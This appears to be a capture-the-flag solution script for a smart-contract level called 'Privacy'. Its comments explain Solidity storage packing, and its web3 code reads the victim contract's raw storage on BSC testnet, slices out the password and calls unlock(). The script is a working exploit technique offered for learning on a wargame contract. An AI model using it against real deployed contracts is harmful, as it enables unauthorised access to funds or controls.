# The objective here is to get to get the password from the EVM storage. The storage layout
# pattern can be understood from the solidity language docs, but it is not an easy read. Each
# storage slot is 32 bytes long and each slot is used in a sequential way according to variable
# declarations in the contract. Multiple items with less than 32 bytes can be packed into a
# single storage slot.

# The victim contract has 6 variable declarations being a bool, a uint 256, two uint 8, a
# uint16 and a fixed-size 3 array of bytes32. The password is in the second position of the
# array and the bytes are cast to a bytes16. This type casting in solidity is a simple slice
# of the first 16 bytes.

# To try to identify the memory location of the password I proceed to print the first 10
# stores. By the look of it I had 5 populated stores:
# HEX Storage (lenght: 66): 0x0000000000000000000000000000000000000000000000000000000000000001
# HEX Storage (lenght: 66): 0x00000000000000000000000000000000000000000000000000000000641128a0
# HEX Storage (lenght: 66): 0x0000000000000000000000000000000000000000000000000000000028a0ff0a
# HEX Storage (lenght: 66): 0x8c931785546bd2ead9830ef41832c65608524fb7adfb239ead60a640a7815cef
# HEX Storage (lenght: 66): 0xc8fd6b02b0eaed3adb4d87773328a72f7600d1677ad98f8c493b5211aef9872d
# HEX Storage (lenght: 66): 0xde09a5a6893024aac89d9636068099c5a06b60b67139cbf947b9beb507ba15e9
# HEX Storage (lenght: 66): 0x0000000000000000000000000000000000000000000000000000000000000000
# HEX Storage (lenght: 66): 0x0000000000000000000000000000000000000000000000000000000000000000
# HEX Storage (lenght: 66): 0x0000000000000000000000000000000000000000000000000000000000000000
# HEX Storage (lenght: 66): 0x0000000000000000000000000000000000000000000000000000000000000000

# The first one seems to be entirely for the boolean variable, the second slot seems to be 
# the uint256, the third slot seems to be packing two uint8 and a uint16 and the next three
# slots seem to be packing the bytes32 array with each one representing one position in the
# array. Considering a zero indexed array, the 2 index would be the last bytes32 position
# or slot 5. I got that slot bytes representation and sliced the first 16 bytes, as the
# solidity type cast would do, and passed it into the unlock function.

from web3 import Web3, middleware
from web3.middleware import construct_sign_and_send_raw_middleware
from web3.middleware import geth_poa_middleware # Needed for BSC

# Util library to work with private keys and address
from eth_account import Account

# Library to read the JSONs that contains the contract ABI
import json

# Setting up the account to sign transactions.
main_account = Account.from_key("") #TODO: Include main operator PK
print("Main wallet: " + main_account.address)

# Setting up the provider. For this solution I had to use BSC Testnet
w3Provider = Web3(Web3.HTTPProvider("https://data-seed-prebsc-1-s1.binance.org:8545"))
w3Provider.middleware_onion.inject(geth_poa_middleware, layer=0) # needed for BSC
w3Provider.middleware_onion.add(construct_sign_and_send_raw_middleware(main_account))
w3Provider.eth.default_account = main_account.address

# Gas strategy is a parameter necessary for BSC Testnet
def gas_price_strategy(web3, transaction_params):
    return Web3.toWei(10, 'gwei')

w3Provider.eth.set_gas_price_strategy(gas_price_strategy)
w3Provider.middleware_onion.add(middleware.time_based_cache_middleware)

victimAddress = ""

# We proceed to instance the victim contract
buildFile = open('../contracts/build/contracts/levels/Privacy.sol/Privacy.json', "r")
build = json.loads(buildFile.read())
victimContract = w3Provider.eth.contract(address='', abi=build['abi']) #TODO: Include deployed contract address

# Taking a look at the storage slots
for i in range(10):
    store = Web3.toHex(w3Provider.eth.get_storage_at(victimAddress, i))
    print("HEX Storage (lenght: " + str(len(store)) + "): "+ str(store))

# Found the password at slot 5, casted it to bytes16
raw = w3Provider.eth.get_storage_at(victimAddress, 5)
print("Bytes64 Storage (lenght: " + str(len(raw)) + "): "+ str(raw))
key16 = raw[0:16]
print("Bytes16 Storage (lenght: " + str(len(key16)) + "): "+ str(key16))

# Send the password to the contract
transaction = victimContract.functions.unlock(key16).transact()
print(w3Provider.eth.wait_for_transaction_receipt(transaction))